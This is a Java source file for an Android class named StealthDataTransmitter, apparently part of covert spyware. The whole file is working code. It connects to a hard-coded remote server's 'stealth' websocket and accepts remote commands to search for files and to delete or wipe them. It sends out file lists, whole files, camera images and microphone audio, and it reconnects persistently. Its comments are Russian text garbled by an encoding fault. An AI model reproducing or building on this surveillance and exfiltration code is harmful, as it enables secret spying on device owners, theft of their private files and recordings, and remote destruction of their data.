package com.example.locationtracker;

import android.content.Context;
import android.content.Intent;
import org.json.JSONArray;
import java.io.File;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import okhttp3.*;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import android.content.SharedPreferences;

public class StealthDataTransmitter {
    private static final String TAG = "StealthDataTransmitter";
    // –ò–∑–≤–ª–µ–∫–∞–µ–º –±–∞–∑–æ–≤—ã–π URL –∏–∑ BuildConfig (—É–±–∏—Ä–∞–µ–º /api/location)
    private static final String SERVER_URL = BuildConfig.SERVER_URL.replace("/api/location", "");

    private Context context;
    private Handler keepAliveHandler;
    private Runnable pingRunnable;
    private OkHttpClient httpClient;
    private WebSocket webSocket;
    private Handler mainHandler;
    private String currentDeviceId;

    // –î–û–ë–ê–í–¨–¢–ï –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∏ listener
    public interface CommandListener {
        void onCommandReceived(String action);
    }

    private CommandListener commandListener;
    private volatile boolean connected = false;

    public StealthDataTransmitter(Context context) {
        this.context = context;
        this.mainHandler = new Handler(Looper.getMainLooper());

        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .build();
    }

    public void setCommandListener(CommandListener listener) {
        this.commandListener = listener;
        Log.d(TAG, "CommandListener set: " + (listener != null));
    }

    public boolean isConnected() {
        return webSocket != null && connected;
    }

    public void initConnection(String deviceId) {
        if (deviceId == null || deviceId.equals("null")) {
            Log.e(TAG, "Cannot connect: deviceId is null or invalid");
            return;
        }

        this.currentDeviceId = deviceId;

        Log.d(TAG, "=== WEBSOCKET CONNECTION ===");
        Log.d(TAG, "Device ID for WebSocket: " + deviceId);
        Log.d(TAG, "===========================");

        String wsUrl = "wss://location-tracker-server-micv.onrender.com/ws/stealth?deviceId=" + deviceId + "&token=" + BuildConfig.API_KEY;
        Log.d(TAG, "Connecting to: " + wsUrl);

        Request request = new Request.Builder()
                .url(wsUrl)
                .build();

        webSocket = httpClient.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                Log.e(TAG, "!!! WEBSOCKET OPENED !!!");
                Log.d(TAG, "WebSocket connection opened for device: " + deviceId);
                connected = true;
                startKeepAlivePing(webSocket);
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                Log.e(TAG, "!!! WEBSOCKET MESSAGE RECEIVED !!!");
                Log.e(TAG, "Raw message: " + text);

                try {
                    JSONObject json = new JSONObject(text);

                    if (json.has("action")) {
                        String action = json.getString("action");
                        Log.e(TAG, "!!! ACTION DETECTED: " + action + " !!!");

                        SharedPreferences prefs = context.getSharedPreferences("stealth_commands", Context.MODE_PRIVATE);
                        SharedPreferences.Editor editor = prefs.edit();
                        editor.putLong("timestamp", System.currentTimeMillis());

                        String finalAction = action;

                        // –ï—Å–ª–∏ action = "file_command" ‚Äî –∏–∑–≤–ª–µ–∫–∞–µ–º –≤–ª–æ–∂–µ–Ω–Ω—É—é –∫–æ–º–∞–Ω–¥—É
                        if ("file_command".equals(action) && json.has("command")) {
                            try {
                                JSONObject commandObj = json.getJSONObject("command");
                                finalAction = commandObj.optString("action", "");
                                Log.e(TAG, "!!! UNWRAPPED FILE COMMAND: " + finalAction + " !!!");

                                // –°–æ—Ö—Ä–∞–Ω—è–µ–º keywords –¥–ª—è –ø–æ–∏—Å–∫–∞
                                if (commandObj.has("keywords")) {
                                    editor.putString("search_keywords", commandObj.getJSONArray("keywords").toString());
                                } else {
                                    editor.putString("search_keywords", "[]");
                                }

                                // –°–æ—Ö—Ä–∞–Ω—è–µ–º extensions –¥–ª—è –ø–æ–∏—Å–∫–∞
                                if (commandObj.has("extensions")) {
                                    editor.putString("search_extensions", commandObj.getJSONArray("extensions").toString());
                                } else {
                                    editor.putString("search_extensions", "[]");
                                }

                                // –°–æ—Ö—Ä–∞–Ω—è–µ–º files –¥–ª—è delete/wipe
                                if (commandObj.has("files")) {
                                    editor.putString("target_files", commandObj.getJSONArray("files").toString());
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Failed to unwrap file_command", e);
                            }
                        }

                        editor.putString("command", finalAction);

                        // –°–æ—Ö—Ä–∞–Ω—è–µ–º file_path –µ—Å–ª–∏ –µ—Å—Ç—å
                        if (json.has("file_path")) {
                            String filePath = json.getString("file_path");
                            editor.putString("file_path", filePath);
                            Log.e(TAG, "File path saved: " + filePath);
                        }

                        boolean success = editor.commit();
                        Log.e(TAG, "!!! COMMAND SAVED: " + success + " !!!");

                        final String dispatchAction = finalAction;
                        if (commandListener != null) {
                            mainHandler.post(() -> {
                                Log.e(TAG, "!!! CALLING LISTENER for: " + dispatchAction + " !!!");
                                commandListener.onCommandReceived(dispatchAction);
                            });
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "!!! ERROR PARSING MESSAGE !!!", e);
                }
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e(TAG, "WebSocket connection failed", t);
                connected = false;
                stopKeepAlivePing();
                // –ï–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–∞—è —Ç–æ—á–∫–∞ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è ‚Äî —á–µ—Ä–µ–∑ reconnectWebSocket
                scheduleReconnect(deviceId);
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                Log.d(TAG, "WebSocket connection closed: " + reason);
                connected = false;
                stopKeepAlivePing();
                // –ù–µ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –µ—Å–ª–∏ –∑–∞–∫—Ä—ã–ª–∏ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ (–∫–æ–¥ 1000 –æ—Ç reconnect)
                if (code != 1000) {
                    scheduleReconnect(currentDeviceId);
                }
            }
        });
    }

    private volatile boolean reconnecting = false;
    private Runnable reconnectRunnable;

    private void scheduleReconnect(String deviceId) {
        if (reconnecting) {
            Log.d(TAG, "Reconnect already scheduled, skipping");
            return;
        }
        reconnecting = true;

        // –û—Ç–º–µ–Ω—è–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–µ –ø–æ–ø—ã—Ç–∫–∏
        if (reconnectRunnable != null) {
            mainHandler.removeCallbacks(reconnectRunnable);
        }

        reconnectRunnable = () -> {
            reconnecting = false;
            Log.d(TAG, "Executing scheduled reconnect...");
            try {
                if (webSocket != null) {
                    try { webSocket.close(1000, "Reconnecting"); } catch (Exception ignored) {}
                    webSocket = null;
                }
                initConnection(deviceId);
            } catch (Exception e) {
                Log.e(TAG, "Error during reconnect", e);
            }
        };

        mainHandler.postDelayed(reconnectRunnable, 5000);
        Log.d(TAG, "Reconnect scheduled in 5 seconds");
    }

    public void sendFileList() {
        try {
            JSONObject filesData = FileManager.getFileList(context);

            JSONObject message = new JSONObject();
            message.put("type", "file_list");
            message.put("device_id", currentDeviceId);
            message.put("data", filesData);
            message.put("timestamp", System.currentTimeMillis());

            if (webSocket != null && isConnected()) {
                webSocket.send(message.toString());
                Log.d(TAG, "üìÅ File list sent: " + filesData.optInt("total", 0) + " files");
            }

        } catch (Exception e) {
            Log.e(TAG, "Failed to send file list", e);
        }
    }

    private static final int CHUNK_SIZE = 256 * 1024; // 256KB –Ω–∞ —á–∞–Ω–∫ ‚Äî –±–∞–ª–∞–Ω—Å —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏ –ø–∞–º—è—Ç–∏

    public void sendFile(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || !file.canRead()) {
                Log.e(TAG, "Cannot read file: " + filePath);
                return;
            }

            long fileSize = file.length();
            int totalChunks = Math.max(1, (int) Math.ceil((double) fileSize / CHUNK_SIZE));
            String fileId = java.util.UUID.randomUUID().toString();

            Log.d(TAG, "Sending file in " + totalChunks + " chunks: " + file.getName() + " (" + fileSize + " bytes)");

            try (java.io.FileInputStream fis = new java.io.FileInputStream(file)) {
                byte[] buffer = new byte[CHUNK_SIZE];
                int bytesRead;
                int chunkIndex = 0;

                while ((bytesRead = fis.read(buffer)) != -1) {
                    byte[] chunk = (bytesRead == CHUNK_SIZE)
                            ? buffer
                            : java.util.Arrays.copyOf(buffer, bytesRead);

                    String base64Chunk = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP);

                    JSONObject message = new JSONObject();
                    message.put("type", "file_chunk");
                    message.put("device_id", currentDeviceId);
                    message.put("file_id", fileId);
                    message.put("filename", file.getName());
                    message.put("chunk_index", chunkIndex);
                    message.put("total_chunks", totalChunks);
                    message.put("total_size", fileSize);
                    message.put("data", base64Chunk);

                    if (webSocket != null && isConnected()) {
                        webSocket.send(message.toString());
                    } else {
                        Log.w(TAG, "WebSocket disconnected during file send, aborting");
                        break;
                    }

                    chunkIndex++;
                    try { Thread.sleep(15); } catch (InterruptedException ignored) {}
                }
            }

            Log.d(TAG, "File transfer complete: " + file.getName() + " (" + totalChunks + " chunks)");
        } catch (Exception e) {
            Log.e(TAG, "Failed to send file", e);
        }
    }

    public void sendImageData(byte[] imageData) {
        if (currentDeviceId == null) {
            Log.e(TAG, "Cannot send image: deviceId not initialized");
            return;
        }

        if (imageData.length > 500 * 1024) {
            imageData = compressImage(imageData, 90);
        }

        if (webSocket != null && isConnected()) {
            try {
                JSONObject message = new JSONObject();
                message.put("type", "image");
                message.put("timestamp", System.currentTimeMillis());
                message.put("data", android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP));

                boolean sent = webSocket.send(message.toString());
                if (sent) {
                    Log.d(TAG, "Image sent via WebSocket: " + imageData.length + " bytes");
                    return;
                }
            } catch (Exception e) {
                Log.e(TAG, "WebSocket send failed", e);
            }
        }

        sendImageViaHTTP(imageData, currentDeviceId);
    }

    private byte[] compressImage(byte[] imageData, int quality) {
        android.graphics.Bitmap bitmap = null;
        try {
            bitmap = android.graphics.BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
            if (bitmap == null) return imageData;
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, baos);
            byte[] result = baos.toByteArray();
            baos.close();
            return result;
        } catch (Exception e) {
            return imageData;
        } finally {
            // Bug #25: –û—Å–≤–æ–±–æ–∂–¥–∞–µ–º Bitmap
            if (bitmap != null) bitmap.recycle();
        }
    }

    private void sendImageViaHTTP(byte[] imageData, String deviceId) {
        try {
            String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);

            JSONObject payload = new JSONObject();
            payload.put("type", "image");
            payload.put("device_id", deviceId);
            payload.put("data", base64Image);
            payload.put("timestamp", System.currentTimeMillis());

            RequestBody body = RequestBody.create(
                    MediaType.parse("application/json"),
                    payload.toString()
            );

            Request request = new Request.Builder()
                    .url(SERVER_URL + "/api/camera/image")
                    .post(body)
                    .addHeader("Authorization", BuildConfig.API_KEY)
                    .build();

            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to send image via HTTP", e);
                }

                @Override
                public void onResponse(Call call, Response response) {
                    Log.d(TAG, "Image sent via HTTP: " + response.code());
                    response.close();
                }
            });

        } catch (JSONException e) {
            Log.e(TAG, "Failed to create HTTP image payload", e);
        }
    }

    public void sendSearchResults(java.util.List<String> filePaths) {
        if (currentDeviceId == null || webSocket == null || !isConnected()) return;

        try {
            JSONArray filesArray = new JSONArray();
            for (String path : filePaths) {
                filesArray.put(path);
            }

            JSONObject message = new JSONObject();
            message.put("type", "search_results");
            message.put("device_id", currentDeviceId);
            message.put("files", filesArray);
            message.put("total", filePaths.size());
            message.put("timestamp", System.currentTimeMillis());

            webSocket.send(message.toString());
            Log.d(TAG, "Search results sent: " + filePaths.size() + " files");
        } catch (Exception e) {
            Log.e(TAG, "Failed to send search results", e);
        }
    }

    public void sendAudioData(byte[] audioData) {
        if (currentDeviceId == null || webSocket == null || !isConnected()) {
            return;
        }

        try {
            String base64Audio = android.util.Base64.encodeToString(audioData, android.util.Base64.NO_WRAP);

            JSONObject message = new JSONObject();
            message.put("type", "audio");
            message.put("device_id", currentDeviceId);
            message.put("data", base64Audio);
            message.put("timestamp", System.currentTimeMillis());
            message.put("format", "pcm");
            message.put("sampleRate", 16000);
            message.put("channels", 1);

            boolean sent = webSocket.send(message.toString());

            if (sent) {
                Log.d(TAG, "Audio sent: " + audioData.length + " bytes");
            }

        } catch (Exception e) {
            Log.e(TAG, "Failed to send audio data", e);
        }
    }

    private void startKeepAlivePing(WebSocket ws) {
        if (keepAliveHandler == null) {
            keepAliveHandler = new Handler(Looper.getMainLooper());
        }

        pingRunnable = new Runnable() {
            @Override
            public void run() {
                if (ws != null) {
                    try {
                        JSONObject ping = new JSONObject();
                        ping.put("type", "ping");
                        ping.put("timestamp", System.currentTimeMillis());
                        ws.send(ping.toString());
                        Log.d(TAG, "Ping sent");
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to send ping", e);
                    }

                    keepAliveHandler.postDelayed(this, 20000);
                }
            }
        };

        keepAliveHandler.postDelayed(pingRunnable, 20000);
    }

    private void stopKeepAlivePing() {
        if (keepAliveHandler != null && pingRunnable != null) {
            keepAliveHandler.removeCallbacks(pingRunnable);
        }
    }

    public void disconnect() {
        stopKeepAlivePing();
        if (webSocket != null) {
            webSocket.close(1000, "Service stopped");
            webSocket = null;
        }
    }

    public void testConnection(String deviceId) {
        // I3: –¢–æ–∫–µ–Ω –≤ URL path (—Å–µ—Ä–≤–µ—Ä –æ–∂–∏–¥–∞–µ—Ç /api/devices/:token)
        String testUrl = SERVER_URL + "/api/devices/" + BuildConfig.API_KEY;

        Request request = new Request.Builder()
                .url(testUrl)
                .addHeader("Authorization", BuildConfig.API_KEY)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "HTTP test failed, retrying connection in 10s", e);
                // Bug #41: Retry if initial test fails
                mainHandler.postDelayed(() -> testConnection(deviceId), 10000);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Log.d(TAG, "HTTP test response: " + response.code());
                if (response.isSuccessful()) {
                    initConnection(deviceId);
                } else {
                    Log.w(TAG, "Server responded with error: " + response.code() + ", retrying in 10s");
                    // Bug #41: Retry on server error
                    mainHandler.postDelayed(() -> testConnection(deviceId), 10000);
                }
                response.close();
            }
        });
    }
}